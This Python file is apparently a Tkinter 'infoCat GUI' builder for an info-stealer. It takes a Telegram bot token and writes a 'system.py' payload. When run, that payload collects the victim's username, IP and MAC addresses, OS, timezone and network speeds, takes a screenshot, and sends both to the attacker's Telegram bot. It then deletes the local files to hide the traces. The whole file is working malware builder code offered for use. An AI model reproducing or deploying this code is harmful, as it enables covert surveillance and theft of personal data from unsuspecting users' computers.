# -*- coding: utf-8 -*-
from tkinter import *
from tkinter import messagebox as mb
from PIL import ImageTk, Image
import webbrowser


def clicked():
    system = open("system.py", "w")
    system.write('''
import getpass
import os
import socket
import sys
from datetime import datetime, timezone
from uuid import getnode as get_mac
import pyautogui
from speedtest import Speedtest
import telebot
from PIL import Image

bot = telebot.TeleBot("''' + API.get() + '''")

start = datetime.now()

name = getpass.getuser()
ip = socket.gethostbyname(socket.getfqdn())
mac = get_mac()
ost = sys.platform
inet = Speedtest()
download = float(str(inet.download())[0:2] + "."
                 + str(round(inet.download(), 2))[1]) * 0.125
uploads = float(str(inet.upload())[0:2] + "."
                + str(round(inet.download(), 2))[1]) * 0.125

time = datetime.now(timezone.utc).astimezone()
os.getcwd()
os.chdir(r"''' + direct.get() + ''' ")
screen = pyautogui.screenshot("screenshot.jpg")

ends = datetime.now()
workspeed = format(ends - start)
os.getcwd()
os.chdir(r"''' + direct.get() + ''' ")
if ost == "win32":
    ost = str("Windows")
elif ost == "linux":
    ost = str("Linux")
elif ost == "darwin":
    ost = str("Mac OS")
else:
    pass
file = open("info.txt", "w")
file.write(f'[================================================]\\n  Operating System: {ost}\\n  Username: {name}\\n  IP adress: {ip}\\n  MAC adress: {mac}\\n  Timezone: {time}\\n  Work speed: {workspeed}\\n  Download: {download} MB/s\\n  Upload: {uploads} MB/s\\n [================================================]')
file.close()

text = "Screenshot"


@bot.message_handler(commands=['start'])
def start_message(message):
    upfile = open("''' + direct.get() + '''\info.txt", "rb")
    uphoto = open("''' + direct.get() + '''\screenshot.jpg", "rb")
    bot.send_photo(message.chat.id, uphoto, text)
    bot.send_document(message.chat.id, upfile)

    upfile.close()
    uphoto.close()

    os.remove("info.txt")
    os.remove("screenshot.jpg")

    bot.stop_polling()


bot.polling()
''')
    system.close()
    mb.showinfo("INFO", "The system.py file is ready!")


def clicked2():
    answer = mb.askyesno(title="Redirecting", message="Open author feedback?")
    if answer:
        webbrowser.open("https://t.me/infocat_bot", new=2)
    else:
        pass


root = Tk()
root.configure(background="#000000")
root.title("infoCat GUI")
root.iconbitmap("icon.ico")
root.geometry("300x400")

img = Image.open("logo.jpg")
image = ImageTk.PhotoImage(img)

initil = Label(root, image=image)
initil.grid(padx=0, pady=0)

text = Label(root, text="Telegram bot token", bg="#000000", fg="#ffffff")
text.grid(padx=0, pady=0)

API = Entry(root, width=20, bg="#8c8c8c")
API.grid(padx=0, pady=0)

text2 = Label(root, text="Path to save the files", bg="#000000", fg="#ffffff")
text2.grid(padx=0, pady=0)

direct = Entry(root, width=20, bg="#8c8c8c")
direct.grid(padx=0, pady=0)

button = Button(root, text="     Build     ", command=clicked, background="#ffea00", height=2)
button.grid(padx=6, pady=6)

help = Button(root, text="     Help     ", command=clicked2, background="#ffea00", height=1)
help.grid(padx=6, pady=8)

root.mainloop()
